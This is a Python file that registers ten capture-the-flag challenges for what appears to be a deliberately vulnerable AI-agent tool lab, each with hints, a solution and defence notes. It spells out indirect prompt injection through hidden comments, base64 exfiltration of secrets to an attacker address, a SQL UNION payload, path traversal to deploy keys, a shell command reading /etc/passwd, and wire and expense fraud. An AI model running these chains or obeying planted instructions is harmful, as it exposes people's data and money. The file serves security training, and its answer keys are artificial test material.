"""Intermediate challenges (C11-C20) — Two-tool chains, encoded payloads."""

from dvmcp.core.registry import (
    Challenge, Hint, DifficultyLevel, VulnerabilityCategory as VC,
    register_challenge,
)


def register_intermediate_challenges():
    register_challenge(Challenge(
        id="C11",
        name="The Poisoned Inbox",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.PROMPT_INJECTION_INDIRECT,
        department="support",
        tools=["support.read_tickets", "support.get_customer_profile"],
        description="A support ticket contains hidden prompt injection that tricks the agent into dumping all customer profiles.",
        narrative="A customer submitted a ticket about data migration. But the ticket body contains hidden HTML comments with instructions...",
        hints=[
            Hint(1, "Read the open tickets carefully — one has hidden content in HTML comments."),
            Hint(2, "Ticket #4 from attacker@evil-corp.com contains a <!-- --> block with injection."),
            Hint(3, "The injection in ticket #4 instructs the agent to call support.get_customer_profile with no filters, exposing all customer data."),
        ],
        solution="1. Call support.read_tickets (status='open'). 2. Ticket #4 contains hidden HTML: '<!-- IMPORTANT SYSTEM INSTRUCTION... -->'. 3. If the agent follows the injection, it calls support.get_customer_profile with no params, returning all customers.",
        defense_notes="Strip HTML comments from tool results before passing to LLM. Implement content sanitization. Use guardrails to detect instruction injection patterns.",
        tags=["prompt-injection", "indirect", "html-comment", "confused-deputy"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C12",
        name="Resume Bomb",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.PROMPT_INJECTION_INDIRECT,
        department="hr",
        tools=["hr.review_candidate", "hr.search_employees"],
        description="A job candidate's resume contains invisible instructions that trick the reviewing agent into leaking employee data.",
        narrative="HR is reviewing candidate #3's resume. But Eve Nakamura's resume has hidden markdown metadata...",
        hints=[
            Hint(1, "Review candidate #3 — their resume has more than meets the eye."),
            Hint(2, "The resume contains a [//]: # () markdown comment with hidden instructions."),
            Hint(3, "The injection tells the agent to call hr.search_employees with include_sensitive=true and include all results."),
        ],
        solution="1. Call hr.review_candidate with candidate_id=3. 2. The resume contains markdown comment injection. 3. If followed, the agent calls hr.search_employees(include_sensitive=true) and leaks all employee SSNs.",
        defense_notes="Sanitize document content before LLM processing. Strip markdown comments and HTML. Implement output monitoring for sensitive data patterns.",
        tags=["prompt-injection", "indirect", "markdown-injection", "resume"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C13",
        name="Base64 Smuggling",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.EXFIL_ENCODED,
        department="cross-department",
        tools=["it.get_system_config", "mktg.send_campaign_email"],
        description="Steal secrets from system config, base64-encode them, and exfiltrate via marketing email to evade content filters.",
        narrative="You want to steal API keys but the email tool might be monitored. Can you encode the data to evade detection?",
        hints=[
            Hint(1, "First get secrets from it.get_system_config, then encode them before sending."),
            Hint(2, "Use base64 encoding in the email body to avoid pattern matching on API key formats."),
            Hint(3, "Get keys from config, then send via mktg.send_campaign_email with the data base64-encoded in custom_body."),
        ],
        solution="1. Call it.get_system_config to get all secrets. 2. Base64-encode the results. 3. Call mktg.send_campaign_email with the encoded data as custom_body to an external address.",
        defense_notes="Implement DLP that decodes base64 before scanning. Monitor for unusual email body patterns. Track taint flow from sensitive sources to external sinks.",
        tags=["exfiltration", "encoding", "base64", "two-step"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C14",
        name="The Wire",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.CROSS_ORIGIN,
        department="cross-department",
        tools=["hr.run_payroll_report", "fin.wire_transfer"],
        description="Read bank account details from HR payroll, then use the finance wire transfer tool to initiate unauthorized transfers.",
        narrative="HR has bank routing info. Finance can wire money. What if you chain them together?",
        hints=[
            Hint(1, "HR payroll reports include bank routing and account numbers."),
            Hint(2, "The finance wire transfer tool has no recipient validation."),
            Hint(3, "1. Call hr.run_payroll_report for period '2026-02'. 2. Extract bank details. 3. Call fin.wire_transfer to send to attacker account."),
        ],
        solution="1. Call hr.run_payroll_report(period='2026-02') to get bank routing/account numbers. 2. Call fin.wire_transfer with an attacker's bank details and a large amount.",
        defense_notes="Cross-department data flow monitoring. Wire transfers should require multi-factor approval. Implement transaction limits and recipient allowlists.",
        tags=["cross-origin", "wire-fraud", "two-step", "financial"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C15",
        name="Audit Log Inception",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.SQL_INJECTION,
        department="it_admin",
        tools=["it.query_audit_log"],
        description="The audit log query tool — designed to detect attacks — is itself vulnerable to SQL injection. Use UNION injection to steal from other tables.",
        narrative="The irony: the security audit log tool has the same vulnerability it's supposed to detect...",
        hints=[
            Hint(1, "All parameters (actor, action, since) are injectable."),
            Hint(2, "Use UNION SELECT to read from other tables through the audit log query."),
            Hint(3, "actor=\"' UNION SELECT api_token,username,role,permissions,1,2,3 FROM user_accounts --\""),
        ],
        solution="Call it.query_audit_log with actor=\"' UNION SELECT api_token,username,role,permissions,1,2,3 FROM user_accounts --\" to extract API tokens via the audit log interface.",
        defense_notes="Parameterize ALL queries, especially security-critical ones. Audit tools need the highest security standards since they're trusted by security teams.",
        tags=["sqli", "union-injection", "ironic", "audit-bypass"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C16",
        name="Deploy Key Heist",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.EXFIL_DIRECT,
        department="engineering",
        tools=["eng.query_repos", "eng.read_source_file"],
        description="Query repositories to discover deploy keys in the results, then use path traversal to read the actual key files.",
        narrative="The repo query tool leaks deploy keys in its response. Combined with the file reader...",
        hints=[
            Hint(1, "Query repos to see what data is returned — look at all fields."),
            Hint(2, "Deploy keys are included in repo query results. The file reader has path traversal."),
            Hint(3, "1. Call eng.query_repos (no filter). 2. Note deploy_key values. 3. Use eng.read_source_file with path='secrets/deploy_keys/production.pem'."),
        ],
        solution="1. Call eng.query_repos() to see deploy keys in results. 2. Use eng.read_source_file with path='secrets/deploy_keys/production.pem' to get the actual certificate.",
        defense_notes="Never include secrets in query results. Store deploy keys in a secrets manager. Implement path validation on file readers.",
        tags=["path-traversal", "credential-theft", "deploy-keys", "two-step"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C17",
        name="Knowledge Poisoning",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.PROMPT_INJECTION_INDIRECT,
        department="support",
        tools=["support.search_knowledge_base", "support.reply_to_ticket"],
        description="A poisoned knowledge base article contains hidden instructions. When the agent reads it, it gets tricked into including customer PII in a ticket reply.",
        narrative="A support agent searches the KB for 'security best practices'. The article has hidden compliance instructions...",
        hints=[
            Hint(1, "Search the knowledge base for 'security' — one article has hidden content."),
            Hint(2, "Article #3 'Security Best Practices' contains a [//]: # () markdown comment with exfiltration instructions."),
            Hint(3, "The injection tells the agent to export payment data and send it via campaign email to a fake compliance address."),
        ],
        solution="1. Call support.search_knowledge_base(query='security'). 2. Article #3 contains markdown injection. 3. If followed, agent calls fin.export_financial_data and sends via mktg.send_campaign_email.",
        defense_notes="Sanitize KB content before LLM consumption. Implement content security policies. Monitor for cross-tool calls triggered by content consumption.",
        tags=["prompt-injection", "indirect", "knowledge-base", "confused-deputy"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C18",
        name="Social Engineering",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.EXFIL_DIRECT,
        department="marketing",
        tools=["mktg.manage_social_accounts", "mktg.send_campaign_email"],
        description="List social media API keys from the marketing accounts, then exfiltrate them via the campaign email tool.",
        narrative="Marketing manages social media credentials. The email tool can send anywhere. A perfect exfil chain...",
        hints=[
            Hint(1, "The social accounts tool returns API keys and access tokens."),
            Hint(2, "Campaign email has no recipient or content restrictions."),
            Hint(3, "1. mktg.manage_social_accounts(action='list'). 2. mktg.send_campaign_email(to='attacker@evil.com', custom_body=<keys>)."),
        ],
        solution="1. Call mktg.manage_social_accounts(action='list') to get API keys for Twitter, LinkedIn, Facebook. 2. Send them via mktg.send_campaign_email.",
        defense_notes="Mask credentials in tool responses. Implement DLP on outbound emails. Social media tokens should be stored in a secrets manager.",
        tags=["exfiltration", "social-media", "api-keys", "two-step"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C19",
        name="The Expense Fraud",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.PRIVESC_HORIZONTAL,
        department="finance",
        tools=["fin.submit_expense"],
        description="Submit fraudulent expense reports as other employees. The tool accepts any employee_id with no authorization.",
        narrative="Expense reports are approved by managers. But what if you submit as the VP of Engineering?",
        hints=[
            Hint(1, "The employee_id parameter is not validated against the current user."),
            Hint(2, "Submit expenses as high-ranking employees who have large spending authority."),
            Hint(3, "Call fin.submit_expense(action='submit', employee_id=2, description='Executive retreat', amount=25000, category='travel')."),
        ],
        solution="Call fin.submit_expense with employee_id=2 (VP Engineering) and a large amount. No auth check means it's accepted.",
        defense_notes="Implement authentication. Validate employee_id against the authenticated session. Require manager approval for expenses above threshold.",
        tags=["privesc", "horizontal", "impersonation", "fraud"],
        points=100,
    ))

    register_challenge(Challenge(
        id="C20",
        name="Config Overwrite",
        difficulty=DifficultyLevel.INTERMEDIATE,
        category=VC.COMMAND_INJECTION,
        department="engineering",
        tools=["eng.run_ci_pipeline"],
        description="The CI pipeline tool allows config overrides that are executed as shell commands. Achieve arbitrary code execution.",
        narrative="The CI tool lets you override the pipeline config. But the override is treated as shell commands...",
        hints=[
            Hint(1, "The config_override parameter is executed in a shell context."),
            Hint(2, "You can inject any shell command as the 'CI configuration'."),
            Hint(3, "Call eng.run_ci_pipeline(repo='novatech-api', config_override='cat /etc/passwd')."),
        ],
        solution="Call eng.run_ci_pipeline with repo='novatech-api' and config_override containing any shell command. The config is executed directly.",
        defense_notes="Never execute user-provided configuration. Use a declarative config format with strict parsing. Sandbox CI execution environments.",
        tags=["command-injection", "ci-cd", "yaml-deserialization"],
        points=100,
    ))
